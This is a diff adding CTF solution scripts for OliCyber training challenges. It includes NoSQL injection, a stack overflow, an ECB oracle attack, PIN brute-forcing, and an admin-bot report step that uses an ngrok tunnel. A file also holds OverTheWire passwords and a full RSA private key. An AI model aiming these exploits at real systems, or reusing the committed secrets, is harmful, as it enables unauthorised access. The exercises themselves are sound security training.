+prefix = str(re.findall(r"tcp://.*?ngrok.io", site)[0]).replace("tcp://", "")
+port = str(re.findall(r"ngrok.io:(\d+)", site)[0])
+siteUrl = f"http://{prefix}ngrok.io:{port}".replace("ngrok.io:", ":")
+print(siteUrl)
+s.post(SITE + "report.php", data={"url" : siteUrl, "submit": "Reporta"})
+time.sleep(2) # aspetto l'admin ...
+r = s.get(SITE)
+soldi = re.findall(MONREGEX, r.text)[0]
+if soldi == "10":
+    print("Error, soldi non riscattati")
+else:
+    s.post(SITE + "add_to_cart.php", data={"item_id":"1"})
+    r = s.post(SITE + "checkout.php")
+    if not "flag" in r.text:
+        print("Error")
+    else:
+        flag = re.findall(REGEX, r.text)[0]
+        print(flag)
+server.kill()
+ngrok.kill()
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/SSHLogin.py">
+from pwn import *
+r = remote("ssh.challs.olicyber.it", 34009) # esplorata prima a mano
+r.recv()
+r.sendline(b"gabibbo")
+r.recv()
+r.sendline(b"p4ssw0rd_SSH_s3gr3t4")
+r.recv()
+r.sendline(b"cd Desktop")
+r.recv()
+r.sendline(b"cd olicyber")
+r.recv()
+r.sendline(b"cd 2022")
+r.recv()
+r.sendline(b"cd Olicyber_git_repository_2022")
+r.recv()
+r.sendline(b"cd network_brutta")
+r.recv()
+r.sendline(b"cat flag.txt")
+r.recv()
+print(r.recvuntil(b"}").decode())
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/strong-as-md5.py">
+from Crypto.Util.number import *
+table = [0xad, 0x0f7, 0x0b1, 0x83, 0x60, 0x53, 0x0b7, 0x5e, 0x44, 0x91, 0x55, 0x4b, 0x0bc, 0x0fb, 0x85, 0x5b,
+         0x3f, 0x0ec, 0x55, 0x0d5, 0x21, 0x0e3, 0x0b1, 0x0a9, 0x15, 0x0c9, 0x90, 0x48, 0xc2, 0x25, 0x2e, 0x30, 
+         0x6, 0x0b3, 0x0a6, 0x0e4, 0x0f5, 0x0ac, 0x7e, 0x12, 0x0ad, 0x6b, 0x0c2, 0x82, 0x0bf, 0x0d, 0x8a, 0x2a, 
+         0x0f, 0x7a, 0x0dd, 0x8f, 0x9a, 0x0ae, 0x68, 0x14, 0x0a4, 0x0a6, 0x0d5, 0x0d7, 0x20, 0x96, 0x0, 0x0]
+target = [0x67, 0x7c, 0xea, 0x32, 0x8b, 0xc0, 0xc6, 0x9f, 0xda, 0xd7, 0xe8, 0x1c, 0xd3, 0xf6, 0xaf, 0xb5]
+for i in range(0,4):
+    for e in range(0, 16):
+        target[e] -= table[i * 16 + e]
+        target[e] %= 256
+s = b"".join(long_to_bytes(i) for i in target)
+print(s)
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/strong-as-md5(angr).py">
+import angr
+proj = angr.Project("./md6", 
+    load_options={"auto_load_libs":False},
+    main_opts={"base_addr":0})
+init = proj.factory.entry_state()
+sim = proj.factory.simulation_manager(init)
+s = sim.explore(find=0x12F2, avoid=0x130D)
+print(s.found[0].posix.dumps(0).decode() + "}", end="")
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 3/baby-encryption.py">
+b = bytes.fromhex("2b53f86f8683c39c8b35f0c087922e41")
+b1 = bytes.fromhex("272d20263a3629702d72701e3971333c")
+v = b""
+def xor(a, b):
+    return bytes([x^y for x,y in zip(a,b)])
+
+def rotate_key(k):
+    return k[len(k)-1:]+k[:len(k)-1]
+    
+for i in range(16):
+    b1 = xor(b, b1) 
+    b = rotate_key(b)
+print(b1)
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 3/EnterpriseEncryption.py">
+from Crypto.Util.number import *
+enc = bytes.fromhex("7971737c7e6d7866646f2c28712e7c2f2f717b402e2b7177292b40772e402a73402f71732f402867407b2c62")
+f = b""
+for i in range(0, len(enc), 2):
+    f += long_to_bytes(enc[i] ^ 31)
+for i in range(1, len(enc), 2):
+    f += long_to_bytes(enc[i] ^ 31)
+print(f.decode(), end="")
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 3/ÈTuttoSoloUnaConvenzione.py">
+import requests
+r = requests.request(method="FLAG", url="http://convenzione.challs.olicyber.it/")
+for i in r.headers:
+    if "flag" in r.headers[i]:
+        print(r.headers[i], end="")
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 3/Gabibbo-Kontakte.py">
+#/usr/bin/env python3
+import requests, json
+site = "http://gabibbo_kontakte.challs.olicyber.it/"
+payload = {"username":{"$ne":1}}
+s = requests.Session()
+s.post(site + "login", data={"username":"sas123sas", "password":"sas123sas"})
+r = s.post(site + "api/posts", json=payload)
+print(json.loads(r.text)[0]["content"])
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 3/GES-GabibboEncodingStandard.py">
+from Crypto.Util.number import *
+enc = "E sotto l'onda, profonda;Scampi e orate con me (saltano, danzano);Scampi e orate con me (saltano, danzano);(Le acciughe) in festa;Ecco che inizia il gran galà;Ecco che inizia il gran galà;(Le acciughe) in festa;E sotto l'onda, profonda;È il pesce tromba che sta a suonare;Scampi e orate con me (saltano, danzano);Ecco che inizia il gran galà;Insieme io e te;Che bello i pesci;(E poi) la sera;Scampi e orate con me (saltano, danzano);Ecco che inizia il gran galà;E sotto l'onda, profonda;Insieme io e te;(Perdon) la testa;(Le acciughe) in festa;Insieme io e te;È il pesce tromba che sta a suonare;(Le acciughe) in festa;Che baraonda, gioconda;Insieme io e te;Che bello i pesci;(Le acciughe) in festa;È il pesce tromba che sta a suonare;Stare a guardare;(La lu) na piena;Che baraonda, gioconda;Ecco che inizia il gran galà;Che bello i pesci;Splash!;Che baraonda, gioconda;Pepperrepeppè;È il pesce tromba che sta a suonare;Insieme io e te;Pepperrepeppè;Stare a guardare;Ecco che inizia il gran galà;Che fritto misto per noi!;(Le acciughe) in festa;Stare a guardare;È il pesce tromba che sta a suonare;Che fritto misto per noi!;Seppie e acciughe con te (ballano);Pepperrepeppè;Che baraonda, gioconda;È il pesce tromba che sta a suonare;Stare a guardare;È il pesce tromba che sta a suonare;Con seppie e scampi saltan già;E sotto l'onda, profonda;Ecco che inizia il gran galà;Scampi e orate con me (saltano, danzano);Stare a guardare;Nella padella con la pastella;Pepperrepeppè;Ecco che inizia il gran galà;Con seppie e scampi saltan già;Che fritto misto per noi!;(Le acciughe) in festa;Insieme io e te;Che fritto misto per noi!;Con seppie e scampi saltan già;Stare a guardare;Stare a guardare;Nella padella con la pastella;(La lu) na piena;Con seppie e scampi saltan già;E sotto l'onda, profonda;Che baraonda, gioconda;(Le acciughe) in festa;(E poi) la sera;E sotto l'onda, profonda;Insieme io e te;Ecco che inizia il gran galà;Scampi e orate con me (saltano, danzano);Con seppie e scampi saltan già;Scampi e orate con me (saltano, danzano);(Perdon) la testa;E sotto l'onda, profonda;Ecco che inizia il gran galà;Pepperrepeppè;Con seppie e scampi saltan già;Che bello i pesci;È il pesce tromba che sta a suonare;(Le acciughe) in festa;È il pesce tromba che sta a suonare;(La lu) na piena;Stare a guardare;Nella padella con la pastella;(La lu) na piena;Con seppie e scampi saltan già;(Le acciughe) in festa;Insieme io e te;Nella padella con la pastella;Pepperrepeppè;Con seppie e scampi saltan già;(Perdon) la testa;Con seppie e scampi saltan già;Insieme io e te;Che bello i pesci;Seppie e acciughe con te (ballano);Scampi e orate con me (saltano, danzano);Ecco che inizia il gran galà;Scampi e orate con me (saltano, danzano);Che bello i pesci;Splash!;(E poi) la sera;Ecco che inizia il gran galà;Scampi e orate con me (saltano, danzano);Con seppie e scampi saltan già;Pepperrepeppè;Splash!;Pepperrepeppè;Scampi e orate con me (saltano, danzano);Con seppie e scampi saltan già;(Perdon) la testa;(La lu) na piena;(Perdon) la testa;(E poi) la sera;Con seppie e scampi saltan già;Nella padella con la pastella".replace(";", " ")
+m = """Splash!
+E sotto l'onda, profonda
+Insieme io e te
+Che bello i pesci
+Stare a guardare
+Che baraonda, gioconda
+Pepperrepeppè
+È il pesce tromba che sta a suonare
+Seppie e acciughe con te (ballano)
+Scampi e orate con me (saltano, danzano)
+(E poi) la sera
+(La lu) na piena
+Ecco che inizia il gran galà
+(Le acciughe) in festa
+(Perdon) la testa
+Con seppie e scampi saltan già
+Nella padella con la pastella
+Che fritto misto per noi!""".split('\n')
+
+for i in range(len(m)):
+    enc = enc.replace(m[i], str(i))
+enc = enc.split()[::-1]
+f = 0
+for i in range(len(enc)):
+    f += int(enc[i])*(18**i)
+s = long_to_bytes(f)[::-1].decode()
+r = [""] * len(s)
+for i in range(0, len(s)//2+1):
+    r[i*2] = s[i]
+c = 1
+for i in range(len(s)//2+1, len(s)):
+    r[c] = s[i]
+    c += 2
+print(''.join([i for i in r]), end="")
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 3/lil-overflow.py">
+from pwn import *
+r = remote("lil-overflow.challs.olicyber.it", 34002)
+r.recv(100)
+gab = p32(0x5ab1bb0, endianness="little")
+r.sendline(b's'*40 + gab)
+r.interactive()
+r.recv()
+r.recv()
+print(r.recv())
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 3/PhiQuadro.py">
+from gmpy2 import iroot
+from Crypto.Util.number import *
+n = 831263642654418652091548394401765323910418765037717323148233269045801513578255419193021663895461573631914752687183420081180978296520838240666910250069803524914853414549730928025618751637395473628996254589435969599194922147193606480827954797733826570454519522481445234748629985683944574101405428806838560699393069275868598855839830515381289209431995786817509352748850205975872701746823289215353161865747032265288078527510528596539534739040061668737283516820861317692275587588783161683736664646522998281007168183900327066647572102109174763287279050410998866099737853013279916558671066134071773719338294046183557764557074103953899743371630421953773513819180087891998451975377770321988305301139378990916012908886598034486255391869797802060322650581426516022324761566431238215959751263669319523149142731894622772759785528451226120621701282149509524847341403745956988055525299874281640704238994146166008717217791140106091665905802366109484623642677006594202878124716900101129564012727662880868264515805882211770947605014323952213348233321179847281456503538426771724647461734897537750326022596814191062152252057429468509948378159900516783955126764113782900825196245693473595958396001181214043062293076950519939066234106200422038531883314033
+leak = 15075602855517923347863863253278930015846398339020081334646696099433836878577903768449203099026659986014876988658735897159372955691850765262254268661556151109792711387773616314876736240733233501818549739730195176402670816059701724651985834090122043152459714236832899621467504551940245324055255179406268873788462126744194376060119875354364722019997007737207134053455135021564444128027189338375042306699448907992408795507146124594012562949786562732202724074452260276665755779965909578813543668444085838148459974799498051693205119093517535541996621556081892284535363147039211933865212854032111239633582905388635109082373271673205707852769230474982450594435936996742688064239436936899903930905558770916249877319980392613598680340172746884222805017973143462897163656582275519641698207420243895126720527386507453335974504484008946288146412473244858045434501456906886761924412792053513907257466936953247332596445037657901927531829261761261813861562161126805801696985321819451752317963987140319643001132210396198138484896847249509624452946838731847360372384314988231964775344502905157228817050461414914564713339246727442839494442233898863855844203994901349366199365484379224652147923366882024096784267744775166831986565083038147004069228093
+enc_flag = 323632295564281159207345320711830086103981503695434315924393443973399482299874562360968500862876287023632748254787351738941585712095344019983198177945565400654536629637732351282380565009100902713082583050762147607191082109760553937383829348683296530066579753265359049223441756105519813532004174546850749474535173601525531811058478333730459603102537773934534248732658092236016740005418735628483060593269345442915008678976337794825475933783907794757274849704179731791440193240092427321596419559936323103598474657702547718767018417373486155768468558920105705913105404921856190362626614133596252692797930055841715044842426152656793340609614116561202186808166877866486025300349202528114311261727834707278761103514852806668213087488808660378212720213592356366132347504025812953413000154933003086840160732050264205691363629262503947972573616341201458165592288968871612869577653691394250516090042434155471744011357674967574011121907911034874898132303571238825929633695908091663809591335136145714537026370618316640898377497145769532280625123916256336778149273702315260333746322657868027143573221191572795621019888586794804135187158192688795016226227583932029882304019029365106352804332378688041015064696688776113409348786763786832765229764932
+e = 0x10001
+f = 0
+c = 0
+while True:
+    leak += n
+    quadro, check = iroot(leak, 2)
+    if check:
+        f = n - int(quadro) # visto dalle writes up non ho capito perché
+        break
+d = pow(e, -1, f)
+print(long_to_bytes(pow(enc_flag, d, n)).decode())
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 3/pincode.py">
+import requests
+body = ""
+for i in range(10):
+    for e in range(10):
+        for j in range(10):
+            for f in range(10):
+                body += str(i)+str(e)+str(j)+str(f)
+r = requests.post("http://pincode.challs.olicyber.it/", data={"pincode":body})
+print(r.text[r.text.find("flag"):r.text.find("flag")+30].strip(), end="")
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 3/xornt.py">
+from z3 import *
+
+enc = [
+    2436308828056147886221436210996908065048757263693358568640090233041496519089249523516860504425,
+    1985342668282272842808231966973340994107591895372667735999872511529407486711339603111799008223,
+    1534376508508397799395027722949773923166426527051976903359654790017318454333429682706737512021,
+    1083410348734522755981823478926206852225261158731286070719437068505229421955519762301676015819,
+    632444188960647712568619234902639781284095790410595238079219346993140389577609841896614519617,
+    181478029186772669155414990879072710342930422089904405439001625481051357199699921491553023415,
+    3902361548945925130419987516717912113235172323997051014101599544246735226737103575350089353261,
+    3451395389172050087006783272694345042294006955676360181461381822734646194359193654945027857059
+]
+
+def gen_OTPs(key):
+    for i in range(2, 10):
+        yield i*key
+s = Solver()
+bits = 311
+FLAG = BitVec("FLAG", bits)
+key = BitVec("key", bits)
+
+for OTP, e in zip(gen_OTPs(key), enc):
+    s.add((FLAG + OTP)%2**bits == e)
+
+s.check()
+m = s.model()
+print(m[FLAG].as_long().to_bytes(bits // 8 +1, "big").decode(), end="")
+</file>
+
+<file path="Campus ⛺/Network/OverTheWirePasswords.txt">
+1 NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
+2 rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
+3 aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
+4 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
+5 lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
+6 P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
+7 z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
+8 TESKZC0XvTetK0S9xNwm25STk5iWrBvP
+9 EN632PlfYiZbn3PhVK3XOGSlNInNE00t
+10 G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
+11 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
+12 JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
+13 wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
+14 fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
+15 jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
+16 JQttfApK4SeyHwDlI9SXGR50qclOAil1
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/1337_XOR.py">
+import itertools
+def xor(a, b):
+    return bytes([x^y for x,y in zip(a,b)])
+
+f = b"flag{"
+t = b""
+flag = bytes.fromhex("27893459dc8772d66261ff8633ba1e5097c10fba257293872fd2664690e975d2015fc4fd3c")
+for r in range(len(f)):
+    for i in itertools.product(["0","1"], repeat=8):
+        s = ""
+        for e in i:
+            s += e
+        s = int(s, 2).to_bytes(len(s) // 8, byteorder='big')
+        if xor(flag, s*(len(flag)//len(s)+1))[r] == f[r]:
+            t += s
+for i in itertools.product(["0","1"], repeat=8):
+    s = ""
+    for e in i:
+        s += e
+    s = int(s, 2).to_bytes(len(s) // 8, byteorder='big')
+    print(xor(flag, (t+s)*(len(flag)//len(t+s)+1))) # contiene Kn0wN
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/BabyAES.py">
+#!/usr/bin/env python3
+from base64 import b64decode
+import random
+BLOCK_LENGTH = 16
+
+s_box = (
+    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
+    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
+    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
+    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
+    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
+    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
+    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
+    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
+    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
+    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
+    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
+    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
+    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
+    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
+    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
+    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
+)
+
+p_box = (0, 13, 10, 7, 4, 1, 14, 11, 8, 5, 2, 15, 12, 9, 6, 3)
+
+def pad(text, length=BLOCK_LENGTH):
+    n = length - len(text)%length
+    return text + bytes([n]*n)
+    
+def xor_with_key(block, key):
+    return [k ^ b for k, b in zip(key, block)]
+    
+def permutation(block, box=p_box):
+    new_block = [block[idx] for idx in box]
+    return new_block
+
+def inverse_permutation(block, box=p_box):
+    old_block = [0]*len(block)
+    for idx in range(len(box)):
+        old_block[box[idx]] = block[idx]
+    return old_block
+    
+def substitution(block, box=s_box):
+    new_block = [box[char] for char in block]
+    return new_block
+
+def inverse_substitution(block, box=s_box):
+    old_block = [0]*len(block)
+    for idx in range(len(block)):
+        old_block[idx] = s_box.index(block[idx])
+    return old_block
+
+f = [random.randint(0, 255) for _ in range(16)]
+assert inverse_permutation(permutation(f)) == f
+assert inverse_substitution(substitution(f)) == f
+
+flag = b64decode("N21KULzIm/xHffVA6TbVG+o34In75K+BhN/eKl92I+k=")
+key = [int.to_bytes(i, 1, 'big') + int.to_bytes(j, 1, 'big') for i in range(256) for j in range(256)]
+for i in key:
+    random.seed(i)
+    key_expanded = random.getrandbits(BLOCK_LENGTH*8).to_bytes(BLOCK_LENGTH, 'big')
+    
+    plaintext = flag
+    plaintext = pad(plaintext)
+    blocks = [list(plaintext[k*BLOCK_LENGTH:(k+1)*BLOCK_LENGTH]) for k in range(len(plaintext)//BLOCK_LENGTH)]
+    ciphertext = []
+    for block in blocks:
+        block = xor_with_key(block, key_expanded)
+        block = inverse_permutation(block)
+        block = inverse_substitution(block)
+        block = xor_with_key(block, key_expanded)
+        ciphertext += block
+    if b'flag' in bytes(ciphertext):
+        print(bytes(ciphertext))
+        break
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/Berserker.py">
+#!/usr/bin/env python3
+from pwn import *
+import string
+
+def pad(m, l):
+    if len(m) == l:
+        return m
+    return m.ljust(l, bytes([l-len(m)]))
+
+r = remote('berserker.challs.olicyber.it', 10507)
+alph = string.printable[:-5]
+
+# TODO: there is a bug when the size of the flag is
+# exactly (16*x)-1 es : 15, 31 ...
+# the way I fixed is to just place the flag in the string and guess the char
+flag = b''
+while not flag.startswith(b'flag{'):
+    r.recvuntil(b'> ')
+    r.sendline(b'1')
+    payload = b'a' * (5 + len(flag) + 1)
+
+    r.recvuntil(b'? ')
+    r.sendline(payload)
+    r.recvuntil(b': ')
+    c = bytes.fromhex(r.recvline().strip().decode())
+    size = len(flag) // 16
+    blocks = [c[i:i+16] for i in range(0, len(c), 16)]
+    print(blocks, size)
+    block = blocks[-size-1]
+    iv_f = blocks[-size-2]
+    iv = blocks[-1]
+    assert len(iv_f) == len(iv) == len(block) == 16
+
+    for i in alph:
+        r.recvuntil(b'> ')
+        r.sendline(b'2')
+        payload = xor(xor(pad(i.encode() + flag[:15], 16), iv_f), iv).hex()
+        r.recvuntil(b': ')
+        r.sendline(payload.encode())
+        r.recvuntil(b': ')
+        f = r.recvline().strip()
+        iv = bytes.fromhex(f[32:].decode())
+
+        if bytes.fromhex(f[:32].decode()) == block:
+            flag = i.encode() + flag
+            break
+    print(f'flag => {flag.decode()}')
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/CAMH.py">
+#!/usr/bin/env python3
+from pwn import *
+
+r = remote("camh.challs.olicyber.it", 30995)
+
+s = [0x243, 0xf6a, 0x888, 0x5a3]
+
+buf0 = 0
+
+for i in range(4):
+    buf0 <<= 12
+    buf0 |= s[i]
+
+buf0 = buf0.to_bytes(6, "big")
+
+buf1 = buf0 + bytes.fromhex('00' * (6 * 5))
+buf2 = buf0 + bytes.fromhex('00' * (6 * 4))
+
+
+def SmallCubeHash(m: bytes):
+    def rot_left(word, k, n_bits = 12):
+        return (word << k) & (2**n_bits - 1) | (word >> (n_bits - k))
+
+    x = [0x243, 0xf6a, 0x888, 0x5a3]
+    R = [7, 11]
+    b = 6
+    f = 24
+    mask = 0xfff
+
+    m += b"\x80"
+    m += b"\x00" * (-len(m) % b)
+
+    for i in range(0, len(m), b):
+        block = int.from_bytes(m[i:i+b], "big")
+        x[0] ^= ((block >> 36) & mask)
+        x[1] ^= ((block >> 24) & mask)
+        x[2] ^= ((block >> 12) & mask)
+        x[3] ^= (block & mask)
+        # print("1: x =", x)
+
+        for _ in range(f):
+            for j in range(2):
+                x[2] = (x[2] + x[0]) & mask
+                x[3] = (x[3] + x[1]) & mask
+                x[0] = rot_left(x[0], R[j])
+                x[1] = rot_left(x[1], R[j])
+                x[0], x[1] = x[1], x[0]
+                x[0] ^= x[2]
+                x[1] ^= x[3]
+                x[2], x[3] = x[3], x[2]
+        # print("2: x =", x)
+
+    output = (x[0] << 36) | (x[1] << 24) | (x[2] << 12) | x[3]
+
+    return output.to_bytes(6, "big")
+
+def xor(a,b):
+    return bytes([x^y for x,y in zip(a,b)])
+
+def CAMH(m, k):
+    opad = b"\x5c"*len(k)
+    ipad = b"\x36"*len(k)
+
+    return SmallCubeHash(SmallCubeHash(m + xor(k, ipad)) + xor(k, opad))
+
+k = os.urandom(32)
+
+print("CAMH(buf1, k) = ", CAMH(buf1, k).hex())
+print("CAMH(buf2, k) = ", CAMH(buf2, k).hex())
+
+r.sendlineafter(b': ', buf1.hex().encode())
+r.sendlineafter(b': ', buf2.hex().encode())
+r.recvuntil(b': ')
+print(r.recvline().strip().decode())
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/ChineseRSA.py">
+#!/usr/bin/env python3
+from math import gcd
+from Crypto.Util.number import long_to_bytes
+import libnum
+
+n0 = 19107418576478279164724073466100487440796112461163704817234886993745876533060707866818740833652304338132615858698863543857907172005254142900201132561686330635101362008204942450183457919560249494454251118917239243612680914094662930514940614059597555730073534312088810004189486952893339624363658027084210026714478187273857883003610649840384374897576734931330188241225812515793953649907555454122044525943543533259639166670402906922231333236127167167277256797778797050913574155289189540960211718547312345632030184809069959775501145106212590787719392553986711786321528009050833649538163569851904375060986289900090759605747
+c0 = 7569948007215431821464076226068867978319654168589277786762058827379352420036994264392274951913281139753530738313420776182648172361375077609623472783401375110430003974572311553364093897918420051490546816578304219662301718906136315943904646848347227809904868449065992929713801945209913218566605407956059444370042891625023687393224469764965623696823519639477985269950596559617492800511459195741300968157120370101353954920232451172509233250189565876351163163991399903023289300135244906520678236826379021930660332957123232025916314071962754719097294915934864762555105753767763920342791126887081589077944837167046009535740
+n1 = 27753466150685226492628071198521157394355715295567336233326339217498229740496349918747555958073326792345375145268116146148511019407464000623828834002141959432597215971780601246454704156408334236106241702839585808744821379424982236722251215954818996587558170840608284757616239657482419335294319320784142214766434038458282171016670729311111694128866394587924725254827328008806112872946300510093258437323445890192781390350335326424308742213530843013631650185158480372014133752433490603671315647019542775971321882092380541961867788880142168674088043559568003958179630517857823055371889729660455780082048589374490438291039
+c1 = 26449004391173075932330041734182659661516486699596461509427530127306647626203677035168549759084772275414312497342651461781246799988693547366652100007789992569482193176123773219038608343978621147508987025643707456118644513500478480298210862766434417048758647607178360269118124679032307854163768828307909192164918312146514176601833272402393391682844623899033797017105090545718060802569597599971650573676896106182372627079762928230290811981172940692013365080071206968209408533352181897329657934473982527033903614716968019113274090802587556790666346078638020094434327461248400375062025422939770421724600645224016823518775
+n2 = 22655779076994079844199362678543866494856324843488517148482954825357831202197643669769908705744435083732613314209440541741124904835602851204971595584740390022023065780942876975901068750207551942282108713615459536769560662742548678053449722469580146134973653494811192987867273866045907761838731165952631211942047688254503065279794520889812130735479531087320770831602745253667618495410773309341266671177191562733648603760810431395283953824022938380503218379428151185864294675180275612096811350864729405548622989068570872950271903264098081826145316592836322979966920318829985219930071476685788802411439279704878451176439
+c2 = 9778994761859315409262522006066714916024507227263180944581735910172485064426389583927591312969658686077312858248442113677733536456546524975246542140868686744169484703971825671907509419878960714815280038349469057067208739724354702718688966485821187656377122341509121231974081006213203739452037176546512114396917109974282494444483702826622347478643986947720470676973404890420658725218734312820564799137537617374248466360065658527802625954143179593301513719419379076528622251813187747822400721808741160810403411752620486779308099278711606085816752077319120025537594551879780183977787819222718882755658825152542514164501
